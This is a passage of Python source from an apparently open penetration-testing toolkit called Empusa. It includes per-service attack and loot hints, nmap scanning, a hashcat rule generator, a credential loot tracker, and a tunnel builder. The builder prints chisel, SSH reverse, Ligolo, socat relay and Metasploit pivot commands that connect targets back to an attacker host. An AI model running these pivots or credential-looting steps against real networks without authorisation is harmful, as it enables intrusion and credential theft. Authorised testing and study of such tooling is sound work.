                    pf.write("# - Try default creds or admin/admin on CMS\n")
                elif service == "ssh":
                    pf.write("# - Check for weak/default SSH credentials\n")
                    pf.write("# - Loot: ~/.ssh/id_rsa, authorized_keys, bash_history\n")
                    pf.write("# - Post-exploitation: SSH pivot or key reuse\n")
                elif service in ["smb", "microsoft-ds", "microsoft_ds"]:
                    pf.write("# - Enum with smbmap, enum4linux-ng, NetExec (nxc)\n")
                    pf.write("# - Loot: shares, SAM/NTDS.dit, SYSVOL, GPP passwords\n")
                    pf.write("# - Check for null sessions and guest access\n")
                elif service == "ftp":
                    pf.write("# - Check for anonymous login\n")
                    pf.write("# - Loot: upload directories, backup archives, creds.txt\n")
                    pf.write("# - Post-exploitation: file upload for persistence\n")
                elif service == "rdp":
                    pf.write("# - Confirm NLA status and CredSSP vulnerabilities\n")
                    pf.write("# - Brute force with Hydra or Crowbar (if permitted)\n")
                    pf.write("# - Loot: screenshots, clipboard access, session hijack\n")
                elif service == "mysql":
                    pf.write("# - Attempt login with root/root or no password\n")
                    pf.write("# - Loot: mysql.user table, sensitive schema dumps\n")
                    pf.write("# - Post-exploitation: data exfil or local file read\n")
                elif service == "telnet":
                    pf.write("# - WARNING: Telnet is plaintext and sniffable\n")
                    pf.write("# - Try common creds: admin:admin, root:root\n")
                    pf.write("# - Loot: configs, debug menus, motd banners\n")
                elif service == "winrm":
                    pf.write("# - Test with evil-winrm or NetExec (nxc)\n")
                    pf.write("# - Loot: PowerShell history, execution context\n")
                    pf.write("# - Post-exploitation: PS credential injection\n")
                elif service == "ldap":
                    pf.write("# - Use ldapsearch or nmap --script=ldap* for info leak\n")
                    pf.write("# - Loot: usernames, OU structure, domain policies\n")
                    pf.write("# - Check for anonymous binds or ASREPRoastable users\n")
                else:
                    pf.write("# - Investigate service manually or with nmap scripts\n")
                    pf.write("# - Loot: banners, misconfigurations, leaks\n")
                pf.write("# ============================\n")
        except Exception as e:
            log_verbose(f"Warning: Could not write port file {port_file_path}: {e}", "yellow")

    if run_hooks_fn is not None:
        run_hooks_fn("post_scan", {
            "ip": ip,
            "scan_output": str(output_file),
            "os_type": detect_os(output_file),
            "ports_dir": str(ports_dir),
        })

    return ip, output_file


# ═══════════════════════════════════════════════════════════════════
#  Host summary
# ═══════════════════════════════════════════════════════════════════

def summarize_hosts(env_name: str) -> None:
    """Summarize scan results for all hosts in an environment."""
    base_dir = Path(env_name).absolute()
    if not base_dir.exists():
        return

    host_rows: List[Tuple[str, str, str]] = []
    try:
        for entry in sorted(base_dir.iterdir()):
            if not entry.is_dir() or "-" not in entry.name:
                continue
            nmap_dir = entry / "nmap"
            if not nmap_dir.is_dir():
                continue
            parts = entry.name.rsplit("-", 1)
            ip_part = parts[0]
            os_part = parts[1] if len(parts) > 1 else "Unknown"
            nmap_file = entry / "nmap" / "full_scan.txt"
            ports_list: List[str] = []
            if nmap_file.exists():
                try:
                    for line in nmap_file.read_text(errors='ignore').splitlines():
                        if "/tcp" in line and "open" in line:
                            line_parts = line.split()
                            if len(line_parts) >= 3:
                                ports_list.append(f"{line_parts[0]} {line_parts[2]}")
                except Exception as e:
                    log_verbose(f"Warning: Could not read {nmap_file}: {e}", "yellow")
            ports_display = ", ".join(ports_list) if ports_list else "No open ports"
            host_rows.append((ip_part, os_part, ports_display))
    except Exception as e:
        log_error(f"Error listing environment: {e}")

    if host_rows:
        table = Table(
            title="Host Summary",
            show_lines=True,
            border_style="blue",
            title_style="bold blue",
        )
        table.add_column("IP", style="bold white", min_width=15)
        table.add_column("OS", style="magenta", min_width=8)
        table.add_column("Open Ports", style="cyan")
        for ip_val, os_type, ports_str in host_rows:
            table.add_row(ip_val, os_type, ports_str)
        if not CONFIG['quiet']:
            console.print(table)
    else:
        log_info("No scan results found to summarize.", "bold yellow")


# ═══════════════════════════════════════════════════════════════════
#  Shell history configuration
# ═══════════════════════════════════════════════════════════════════

def configure_shell_history(hist_file: Path) -> None:
    """Configure shell history logging for cross-platform support."""
    hist_file = Path(hist_file).absolute()

    if IS_WINDOWS:
        profile_path = (
            Path(os.environ.get("USERPROFILE", ""))
            / "Documents" / "WindowsPowerShell"
            / "Microsoft.PowerShell_profile.ps1"
        )
        profile_path.parent.mkdir(parents=True, exist_ok=True)

        if profile_path.exists():
            content = profile_path.read_text(errors='ignore')
            if str(hist_file) in content:
                log_verbose(f"PowerShell profile already configured for {hist_file}", "yellow")
                return

        config = f'''
# Empusa Command Logging
$EmpusaHistoryFile = "{hist_file}"
Register-EngineEvent PowerShell.Exiting -Action {{
    Get-History | Export-Csv -Path $EmpusaHistoryFile -Append -NoTypeInformation
}}
'''
        if CONFIG['dry_run']:
            log_info(f"[DRY RUN] Would configure PowerShell profile: {profile_path}", "yellow")
            return

        try:
            with profile_path.open("a", encoding='utf-8') as f:
                f.write(config)
            log_success(f"[+] PowerShell profile configured: {profile_path}")
            log_info("Restart PowerShell or run: . $PROFILE", "yellow")
        except Exception as e:
            log_error(f"Error configuring PowerShell profile: {e}")
            log_info("You can manually log commands to the file.", "yellow")

    elif IS_UNIX:
        shell = os.environ.get("SHELL", "/bin/bash")
        if "bash" in shell:
            rc_file = Path.home() / ".bashrc"
            config = f'''
# Empusa Command Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTTIMEFORMAT="%F %T "
shopt -s histappend
PROMPT_COMMAND="history -a; ${{PROMPT_COMMAND}}"
'''
        elif "zsh" in shell:
            rc_file = Path.home() / ".zshrc"
            config = f'''
# Empusa Command Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export SAVEHIST=20000
export HISTTIMEFORMAT="%F %T "
setopt EXTENDED_HISTORY
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
'''
        else:
            log_verbose(f"Unsupported shell: {shell}. Command logging may not work.", "yellow")
            return

        if rc_file.exists():
            content = rc_file.read_text(errors='ignore')
            if str(hist_file) in content:
                log_verbose(f"Shell RC file already configured for {hist_file}", "yellow")
                return

        if CONFIG['dry_run']:
            log_info(f"[DRY RUN] Would configure shell logging in {rc_file}", "yellow")
            return

        try:
            with rc_file.open("a") as f:
                f.write(config)
            log_success(f"[+] Shell logging hook written to {rc_file}")
            log_info(f"Please run: source {rc_file}", "yellow")
        except Exception as e:
            log_error(f"Error configuring shell: {e}")
    else:
        log_verbose("Unknown platform. Command logging not configured.", "yellow")


# ═══════════════════════════════════════════════════════════════════
#  Environment build
# ═══════════════════════════════════════════════════════════════════

def build_env(
    env_name: str,
    ips: List[str],
    *,
    run_hooks_fn: Optional[Callable[..., Any]] = None,
) -> None:
    """Build penetration testing environment with scanning and file structure."""
    valid_ips: List[str] = []
    for ip in ips:
        if validate_ip(ip):
            valid_ips.append(ip)
        else:
            log_error(f"Invalid IP address: {ip} - skipping")

    if not valid_ips:
        log_error("No valid IP addresses provided. Aborting.")
        return

    if not check_tool_exists("nmap"):
        log_error("Error: nmap not found. Please install nmap first.")
        return

    if CONFIG['dry_run']:
        log_info(f"[DRY RUN] Would build environment '{env_name}' for IPs: {', '.join(valid_ips)}", "yellow")
        return

    base_dir = Path(env_name).absolute()

    if base_dir.exists() and any(base_dir.iterdir()):
        if CONFIG['dry_run']:
            log_info(f"[DRY RUN] Environment '{env_name}' already exists", "yellow")
        elif not Confirm.ask(f"[yellow]Environment '{env_name}' already exists. Continue?[/yellow]"):
            return

    base_dir.mkdir(parents=True, exist_ok=True)

    users_file = base_dir / f"{env_name}-users.txt"
    passwords_file = base_dir / f"{env_name}-passwords.txt"
    commands_log_file = base_dir / "commands_ran.txt"

    users_file.touch()
    passwords_file.touch()
    commands_log_file.touch()

    # Shell history logging is opt-in to avoid mutating the operator's
    # shell profile (especially important in CI / containers).
    if Confirm.ask(
        "[yellow]Enable shell history logging for this env?[/yellow]",
        default=False,
    ):
        configure_shell_history(commands_log_file)

    ip_dirs: Dict[str, Path] = {}
    for ip in valid_ips:
        temp_path = base_dir / ip
        nmap_path = temp_path / "nmap"
        nmap_path.mkdir(parents=True, exist_ok=True)
        ip_dirs[ip] = nmap_path

    if run_hooks_fn is not None:
        run_hooks_fn("pre_build", {
            "env_name": env_name,
            "ips": valid_ips,
        })

    log_info("\n[*] Starting threaded Nmap scanning...", "bold green")
    scan_results: Dict[str, Path] = {}
    max_workers = min(CONFIG['max_workers'], len(valid_ips))

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {
            executor.submit(run_nmap, ip, nmap_path, run_hooks_fn=run_hooks_fn): ip
            for ip, nmap_path in ip_dirs.items()
        }

        if not CONFIG['quiet']:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task(f"[cyan]Scanning {len(valid_ips)} hosts...", total=len(valid_ips))
                for future in as_completed(future_to_ip):
                    ip, scan_output = future.result()
                    scan_results[ip] = scan_output
                    progress.advance(task)
        else:
            for future in as_completed(future_to_ip):
                ip, scan_output = future.result()
                scan_results[ip] = scan_output

    for ip, scan_output in scan_results.items():
        os_type = detect_os(scan_output)
        old_path = base_dir / ip
        new_path = base_dir / f"{ip}-{os_type}"

        if new_path.exists():
            log_verbose(f"Warning: {new_path} already exists. Skipping rename.", "bold red")
        else:
            try:
                old_path.rename(new_path)
                log_success(f"[+] {ip} classified as {os_type} -> {new_path}")
            except Exception as e:
                log_error(f"Error renaming {old_path}: {e}")

    try:
        with commands_log_file.open("a") as f:
            f.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                f"Built environment '{env_name}' with IPs: {', '.join(valid_ips)}\n"
            )
    except Exception as e:
        log_verbose(f"Warning: Could not write to command log: {e}", "yellow")

    if run_hooks_fn is not None:
        run_hooks_fn("post_build", {
            "env_name": env_name,
            "env_path": str(base_dir),
            "ips": valid_ips,
        })


# ═══════════════════════════════════════════════════════════════════
#  Reverse Tunnel & Port Forward Builder
# ═══════════════════════════════════════════════════════════════════

def build_reverse_tunnel() -> None:
    """Interactive builder for reverse tunnels and port forwarding with multiple tools."""
    render_screen("Reverse Tunnel & Port Forward Builder")
    log_info("[bold]Choose Tunnel Type:[/]")
    log_info("1. Chisel (SOCKS5 proxy)")
    log_info("2. SSH Reverse Tunnel (-R)")
    log_info("3. SSH Local Tunnel (-L)")
    log_info("4. SSH Dynamic SOCKS (-D)")
    log_info("5. Ligolo-ng")
    log_info("6. Socat Port Forward")
    log_info("7. Netsh PortProxy (Windows)")
    log_info("8. Metasploit Autoroute")
    log_info("0. Back to Main Menu")

    choice = Prompt.ask("Select an option", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8'])

    if choice == '0':
        return

    commands: List[Tuple[str, str]] = []
    tunnel_name = ""

    if choice == '1':
        # Chisel SOCKS5
        tunnel_name = "Chisel"
        log_info("\n[bold yellow]Chisel SOCKS5 Proxy Setup[/bold yellow]")

        attacker_ip = Prompt.ask("Enter your attacking machine IP/hostname")
        if not validate_hostname(attacker_ip):
            log_error("Invalid IP/hostname")
            return

        chisel_port = Prompt.ask("Enter Chisel listener port", default="8080")
        if not validate_port(chisel_port):
            log_error("Invalid port number")
            return

        socks_port = Prompt.ask("Enter SOCKS proxy port", default="1080")
        if not validate_port(socks_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"./chisel server -p {chisel_port} --socks5 --reverse"),
            ("Target", f"./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks"),
            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
        ]

    elif choice == '2':
        # SSH Reverse Tunnel
        tunnel_name = "SSH_Reverse"
        log_info("\n[bold yellow]SSH Reverse Tunnel (-R)[/bold yellow]")
        log_info("Expose a target port on your attacker machine")

        attacker_user = Prompt.ask("Enter your username on attacker machine")
        attacker_host = Prompt.ask("Enter your attacker IP/hostname")
        if not validate_hostname(attacker_host):
            log_error("Invalid IP/hostname")
            return

        remote_port = Prompt.ask("Enter port to open on attacker machine", default="8888")
        if not validate_port(remote_port):
            log_error("Invalid port number")
            return

        local_port = Prompt.ask("Enter target port to expose", default="80")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host", default="127.0.0.1")

        commands = [
            ("Target", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -f"),
            ("Alternative (no background)", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host}"),
            ("Access", f"# Connect to localhost:{remote_port} on attacker machine"),
            ("Keep Alive", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3"),
        ]

    elif choice == '3':
        # SSH Local Tunnel
        tunnel_name = "SSH_Local"
        log_info("\n[bold yellow]SSH Local Tunnel (-L)[/bold yellow]")
        log_info("Access a remote service through SSH tunnel")

        attacker_user = Prompt.ask("Enter your username on pivot/SSH server")
        pivot_host = Prompt.ask("Enter pivot/SSH server IP/hostname")
        if not validate_hostname(pivot_host):
            log_error("Invalid IP/hostname")
            return

        local_port = Prompt.ask("Enter local port on your machine", default="8080")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host (from pivot's perspective)", default="127.0.0.1")
        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host} -N -f"),
            ("Alternative (no background)", f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host}"),
            ("Access", f"# Connect to localhost:{local_port} on your machine"),
            ("Multiple Ports", f"ssh -L {local_port}:{target_host}:{target_port} -L 8081:target2:443 {attacker_user}@{pivot_host} -N"),
        ]

    elif choice == '4':
        # SSH Dynamic SOCKS
        tunnel_name = "SSH_SOCKS"
        log_info("\n[bold yellow]SSH Dynamic SOCKS Proxy (-D)[/bold yellow]")
        log_info("Create a SOCKS proxy through SSH")

        attacker_user = Prompt.ask("Enter your username on pivot/SSH server")
        pivot_host = Prompt.ask("Enter pivot/SSH server IP/hostname")
        if not validate_hostname(pivot_host):
            log_error("Invalid IP/hostname")
            return

        socks_port = Prompt.ask("Enter SOCKS proxy port on your machine", default="1080")
        if not validate_port(socks_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"ssh -D {socks_port} {attacker_user}@{pivot_host} -N -f"),
            ("Alternative (no background)", f"ssh -D {socks_port} {attacker_user}@{pivot_host}"),
            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
            ("Usage Example", f"proxychains nmap -sT -Pn 10.10.10.0/24"),
        ]

    elif choice == '5':
        # Ligolo-ng
        tunnel_name = "Ligolo"
        log_info("\n[bold yellow]Ligolo-ng Setup[/bold yellow]")
        log_info("Modern tunneling with TUN interface")

        attacker_ip = Prompt.ask("Enter your attacking machine IP")
        if not validate_hostname(attacker_ip):
            log_error("Invalid IP/hostname")
            return

        ligolo_port = Prompt.ask("Enter Ligolo listener port", default="11601")
        if not validate_port(ligolo_port):
            log_error("Invalid port number")
            return

        tunnel_ip = Prompt.ask("Enter tunnel network (e.g., 240.0.0.1/24)", default="240.0.0.1/24")

        commands = [
            ("Attacker - Setup Interface", f"sudo ip tuntap add user $(whoami) mode tun ligolo"),
            ("Attacker - Bring Up", f"sudo ip link set ligolo up"),
            ("Attacker - Start Proxy", f"./proxy -selfcert -laddr 0.0.0.0:{ligolo_port}"),
            ("Target", f"./agent -connect {attacker_ip}:{ligolo_port} -ignore-cert"),
            ("In Ligolo Console", f"session # Select session"),
            ("In Ligolo Console", f"ifconfig # View target networks"),
            ("Attacker - Add Route", f"sudo ip route add {tunnel_ip} dev ligolo"),
            ("In Ligolo Console", f"start # Start tunnel"),
        ]

    elif choice == '6':
        # Socat
        tunnel_name = "Socat"
        log_info("\n[bold yellow]Socat Port Forward[/bold yellow]")

        listen_port = Prompt.ask("Enter port to listen on", default="8080")
        if not validate_port(listen_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host to forward to")
        if not validate_hostname(target_host):
            log_error("Invalid IP/hostname")
            return

        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Basic Forward", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port}"),
            ("Background", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port} &"),
            ("With Reuseaddr", f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}"),
            ("Reverse Shell Relay", f"socat TCP-LISTEN:{listen_port} TCP:{target_host}:{target_port}"),
            ("Usage", f"# Connect to localhost:{listen_port} to reach {target_host}:{target_port}"),
        ]

    elif choice == '7':
        # Windows Netsh
        tunnel_name = "Netsh"
        log_info("\n[bold yellow]Windows Netsh PortProxy[/bold yellow]")
        log_info("Native Windows port forwarding (requires admin)")

        listen_port = Prompt.ask("Enter port to listen on", default="8080")
        if not validate_port(listen_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host to forward to")
        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        listen_addr = Prompt.ask("Enter listen address", default="0.0.0.0")

        commands = [
            ("Add Port Forward", f"netsh interface portproxy add v4tov4 listenaddress={listen_addr} listenport={listen_port} connectaddress={target_host} connectport={target_port}"),
            ("List Forwards", f"netsh interface portproxy show all"),
            ("Delete Forward", f"netsh interface portproxy delete v4tov4 listenaddress={listen_addr} listenport={listen_port}"),
            ("Reset All", f"netsh interface portproxy reset"),
            ("Firewall Rule", f"netsh advfirewall firewall add rule name=\"Port Forward {listen_port}\" protocol=TCP dir=in localport={listen_port} action=allow"),
            ("Note", "# Requires Administrator privileges"),
        ]

    elif choice == '8':
        # Metasploit Autoroute
        tunnel_name = "Metasploit"
        log_info("\n[bold yellow]Metasploit Autoroute & Port Forward[/bold yellow]")

        session_id = Prompt.ask("Enter Meterpreter session ID", default="1")
        target_subnet = Prompt.ask("Enter target subnet to route (e.g., 10.10.10.0/24)")
        local_port = Prompt.ask("Enter local port for port forward", default="8080")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host for port forward (optional)", default="")
        target_port = Prompt.ask("Enter target port for port forward (optional)", default="")

        commands = [
            ("Autoroute", f"use post/multi/manage/autoroute"),
            ("Set Session", f"set SESSION {session_id}"),
            ("Set Subnet", f"set SUBNET {target_subnet}"),
            ("Run", f"run"),
            ("Verify Routes", f"route print"),
            ("SOCKS Proxy", f"use auxiliary/server/socks_proxy"),
            ("Set Version", f"set SRVPORT 1080"),
            ("Run Proxy", f"run -j"),
        ]

        if target_host and target_port:
            commands.extend([
                ("Port Forward", f"portfwd add -l {local_port} -p {target_port} -r {target_host}"),
                ("List Forwards", f"portfwd list"),
                ("Delete Forward", f"portfwd delete -l {local_port}"),
            ])

    # Display commands
    render_group_heading(f"{tunnel_name} Commands", "bold green")
    for label, cmd in commands:
        log_info(f"\n[cyan]{label}:[/cyan]")
        if not CONFIG['quiet']:
            console.print(f"  {cmd}", style="bold white")

    # Save to file
    if Confirm.ask("\n[yellow]Save these commands to a file?[/yellow]"):
        env_name = Prompt.ask("Enter environment/host name (for filename)", default="tunnel")
        safe_name = sanitize_filename(env_name)
        save_file = Path.cwd() / f"{safe_name}-{tunnel_name.lower()}-commands.txt"

        if save_file.exists() and not CONFIG['dry_run']:
            if not Confirm.ask(f"[yellow]File {save_file} exists. Overwrite?[/yellow]"):
                log_info("Not saving commands.", "yellow")
                return

        if CONFIG['dry_run']:
            log_info(f"[DRY RUN] Would save commands to {save_file}", "yellow")
            return

        try:
            with save_file.open('w') as f:
                f.write(f"# {tunnel_name} Tunnel Commands\n")
                f.write(f"# Generated: {datetime.now().isoformat()}\n")
                f.write(f"# Environment: {env_name}\n\n")

                for label, cmd in commands:
                    f.write(f"# {label}\n")
                    f.write(f"{cmd}\n\n")

            log_success(f"Commands saved to: {save_file}")
        except Exception as e:
            log_error(f"Error saving commands: {e}")


# ═══════════════════════════════════════════════════════════════════
#  Hashcat Rule Generator
# ═══════════════════════════════════════════════════════════════════

def find_password_files(domain: str, search_path: Optional[Path] = None) -> List[Path]:
    """Search for password files matching the domain name."""
    if search_path is None:
        search_path = Path.cwd()

    target_filename = f"{domain}-passwords.txt"
    matches: List[Path] = []

    log_verbose(f"Searching for {target_filename} in {search_path}...")

    try:
        for path in search_path.rglob(target_filename):
            if path.is_file():
                matches.append(path)
                log_verbose(f"Found: {path}", "green")
    except Exception as e:
        log_verbose(f"Warning during search: {e}", "yellow")

    return matches


def generate_hashcat_rules() -> None:
    """Generate hashcat rules from password patterns in environment password file."""
    render_screen("Hashcat Rule Generator")

    domain = Prompt.ask("Enter domain/environment name (used in filename)").strip().rstrip('/')

    matches = find_password_files(domain)

    if not matches:
        log_info(f"No {domain}-passwords.txt found in current directory.", "yellow")
        if Confirm.ask("Search in a different directory?"):
            custom_path = Prompt.ask("Enter directory path to search")
            try:
                matches = find_password_files(domain, Path(custom_path))
            except Exception as e:
                log_error(f"Error searching custom path: {e}")
                return

    if not matches:
        log_error(f"No {domain}-passwords.txt file found.")
        return

    if len(matches) == 1:
        pw_file = matches[0]
    else:
        log_info("Multiple password files found:", "bold yellow")
        for i, path in enumerate(matches):
            log_info(f"{i + 1}. {path}")
        try:
            index = int(Prompt.ask("Select the file to use", choices=[str(i + 1) for i in range(len(matches))])) - 1
            pw_file = matches[index]
        except (ValueError, IndexError):
            log_error("Invalid selection.")
            return

    pw_file = Path(pw_file)
    rule_file = pw_file.parent / "hashcat_generated.rule"

    if rule_file.exists() and not CONFIG['dry_run']:
        if not Confirm.ask(f"[yellow]Rule file {rule_file} already exists. Overwrite?[/yellow]"):
            log_info("Operation cancelled.", "yellow")
            return

    if CONFIG['dry_run']:
        log_info(f"[DRY RUN] Would generate hashcat rules from {pw_file}", "yellow")
        return

    try:
        passwords = [line.strip() for line in pw_file.read_text(errors='ignore').splitlines() if line.strip()]
    except Exception as e:
        log_error(f"Error reading password file: {e}")
        return

    # Analyze password patterns
    rules_list: List[str] = []
    pattern_stats: Dict[str, Any] = {
        'lowercase': 0,
        'uppercase': 0,
        'capitalize': 0,
        'reverse': 0,
        'digit_append': Counter(),
        'symbol_append': Counter(),
        'digit_prepend': Counter(),
        'symbol_prepend': Counter(),
        'years': Counter(),
        'lengths': Counter(),
        'leetspeak': 0,
        'duplicates': 0,
    }

    password_set = set(passwords)

    for pw in passwords:
        if not pw:
            continue

        pattern_stats['lengths'][len(pw)] += 1

        # Case transformations
        if pw.islower():
            pattern_stats['lowercase'] += 1
        elif pw.isupper():
            pattern_stats['uppercase'] += 1
            rules_list.append('u')
        elif pw[0].isupper() and pw[1:].islower():
            pattern_stats['capitalize'] += 1
            rules_list.append('c')

        # Reverse
        if pw[::-1] in password_set and pw[::-1] != pw:
            pattern_stats['reverse'] += 1
            rules_list.append('r')

        # Digit patterns at end
        if len(pw) > 1 and pw[-1].isdigit():
            pattern_stats['digit_append'][pw[-1]] += 1
            rules_list.append(f'${pw[-1]}')
            if len(pw) > 2 and pw[-2:].isdigit():
                for char in pw[-2:]:
                    rules_list.append(f'${char}')

        # Digit patterns at start
        if len(pw) > 1 and pw[0].isdigit():
            pattern_stats['digit_prepend'][pw[0]] += 1
            rules_list.append(f'^{pw[0]}')

        # Symbol patterns at end
        if len(pw) > 1 and pw[-1] in "!@#$%^&*()_+-=[]{}|;:,.<>?":
            pattern_stats['symbol_append'][pw[-1]] += 1
            rules_list.append(f'${pw[-1]}')

        # Symbol patterns at start
        if len(pw) > 1 and pw[0] in "!@#$%^&*()_+-=[]{}|;:,.<>?":
            pattern_stats['symbol_prepend'][pw[0]] += 1
            rules_list.append(f'^{pw[0]}')

        # Year detection (1900-2099)
        year_matches = re.findall(r'(19\d{2}|20\d{2})', pw)
        for year in year_matches:
            pattern_stats['years'][year] += 1
            for digit in year:
                rules_list.append(f'${digit}')

        # Leetspeak detection
        leet_chars = {'@': 'a', '4': 'a', '3': 'e', '1': 'i', '!': 'i', '0': 'o', '5': 's', '7': 't'}
        if any(char in leet_chars for char in pw):
            pattern_stats['leetspeak'] += 1
            for leet, normal in leet_chars.items():
                if leet in pw:
                    rules_list.append(f's{normal}{leet}')

        # Duplicate detection
        if re.search(r'(.)\1{1,}', pw):
            pattern_stats['duplicates'] += 1
            rules_list.append('d')

    # Generate common combination rules
    common_combos = [
        'c $1',
        'c $!',
        'c $1 $2',
        'c $2 $0',
        'c $1 $9',
        'u $1',
        'u $!',
        '$1 $2 $3',
        '$! $@ $#',
        'c d',
        'c r',
    ]

    if pattern_stats['years']:
        most_common_year = pattern_stats['years'].most_common(1)[0][0]
        for digit in most_common_year:
            common_combos.append(f'c ${digit}')

    rule_counter = Counter(rules_list)
    top_individual_rules = [rule for rule, _ in rule_counter.most_common(20)]

    all_rules = top_individual_rules + common_combos

    unique_rules: List[str] = []
    seen: Set[str] = set()
    for rule in all_rules:
        if rule not in seen:
            unique_rules.append(rule)
            seen.add(rule)

    try:
        with rule_file.open('w') as rf:
            rf.write("# Hashcat rules generated by Empusa\n")
            rf.write(f"# Generated from {len(passwords)} passwords\n")
            rf.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
            for rule in unique_rules:
                rf.write(rule + "\n")

        log_info("\nPassword Pattern Analysis:", "bold cyan")
        log_info(f"  Total passwords analyzed: {len(passwords)}")
        log_info(f"  Lowercase: {pattern_stats['lowercase']}")
        log_info(f"  Uppercase: {pattern_stats['uppercase']}")
        log_info(f"  Capitalized: {pattern_stats['capitalize']}")
        log_info(f"  Contains leetspeak: {pattern_stats['leetspeak']}")
        log_info(f"  Has duplicates: {pattern_stats['duplicates']}")
        log_info(f"  Reverse pairs found: {pattern_stats['reverse']}")

        if pattern_stats['digit_append']:
            top_digits = pattern_stats['digit_append'].most_common(3)
            log_info(f"  Common trailing digits: {', '.join([d for d, _ in top_digits])}")

        if pattern_stats['symbol_append']:
            top_symbols = pattern_stats['symbol_append'].most_common(3)
            log_info(f"  Common trailing symbols: {', '.join([s for s, _ in top_symbols])}")

        if pattern_stats['years']:
            top_years = pattern_stats['years'].most_common(3)
            log_info(f"  Common years: {', '.join([y for y, _ in top_years])}")

        common_lengths = pattern_stats['lengths'].most_common(3)
        log_info(f"  Common lengths: {', '.join([str(l) for l, _ in common_lengths])}")

        log_success(f"\n[+] {len(unique_rules)} hashcat rules generated")
        log_success(f"Saved rules to: {rule_file}")
        log_info(f"\nUsage: hashcat -a 0 -m <mode> <hashfile> <wordlist> -r {rule_file}", "yellow")
    except Exception as e:
        log_error(f"Error writing rule file: {e}")


# ═══════════════════════════════════════════════════════════════════
#  Loot Tracker
# ═══════════════════════════════════════════════════════════════════

def _save_loot(loot_file: Path, entries: List[Dict[str, Any]]) -> None:
    """Save loot entries to JSON file."""
    try:
        loot_file.write_text(json.dumps(entries, indent=2, default=str))
    except Exception as e:
        log_error(f"Error saving loot file: {e}")


def _display_loot_table(entries: List[Dict[str, Any]], title: str = "Loot Tracker") -> None:
    """Render loot entries as a rich table."""
    if not entries:
        log_info("No loot entries found.", "yellow")
        return

    table = Table(title=title, show_lines=True, border_style="cyan")
    table.add_column("#", style="dim", width=4)
    table.add_column("Host", style="bold white", min_width=15)
    table.add_column("Type", style="magenta", min_width=10)
    table.add_column("Username", style="green", min_width=12)
    table.add_column("Secret", style="red", min_width=16)
    table.add_column("Source", style="yellow", min_width=10)
    table.add_column("Notes", style="dim", min_width=12)
    table.add_column("Timestamp", style="dim cyan", width=19)

    for i, entry in enumerate(entries, 1):
        table.add_row(
            str(i),
            entry.get("host", ""),
            entry.get("cred_type", ""),
            entry.get("username", ""),
            entry.get("secret", ""),
            entry.get("source", ""),
            entry.get("notes", ""),
            entry.get("timestamp", ""),
        )

    console.print(table)


def _import_env_creds(env_path: Path, entries: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Import credentials from existing environment user/password files."""
    users_files = list(env_path.rglob("*-users.txt"))
    password_files = list(env_path.rglob("*-passwords.txt"))

    if not users_files and not password_files:
        log_info("No user/password files found in this environment.", "yellow")
        return entries

    existing_secrets: Set[str] = set()
    for e in entries:
        key = f"{e.get('username', '')}:{e.get('secret', '')}:{e.get('host', '')}"
        existing_secrets.add(key)

    imported = 0

    for uf in users_files:
        try:
            for line in uf.read_text(errors='ignore').splitlines():
                username = line.strip()
                if not username or username.startswith('#'):
                    continue
                key = f"{username}::env-import"
                if key not in existing_secrets:
                    entries.append({
                        "host": "unknown",
                        "cred_type": "username",
                        "username": username,
                        "secret": "",
                        "source": uf.name,
                        "notes": "Imported from env users file",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    })
                    existing_secrets.add(key)
                    imported += 1
        except Exception as e:
            log_verbose(f"Warning: Could not read {uf}: {e}", "yellow")

    for pf in password_files:
        try:
            for line in pf.read_text(errors='ignore').splitlines():
                password = line.strip()
                if not password or password.startswith('#'):
                    continue
                key = f":{password}:env-import"
                if key not in existing_secrets:
                    entries.append({
                        "host": "unknown",
                        "cred_type": "plaintext",
                        "username": "",
                        "secret": password,
                        "source": pf.name,
                        "notes": "Imported from env passwords file",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    })
                    existing_secrets.add(key)
                    imported += 1
        except Exception as e:
            log_verbose(f"Warning: Could not read {pf}: {e}", "yellow")

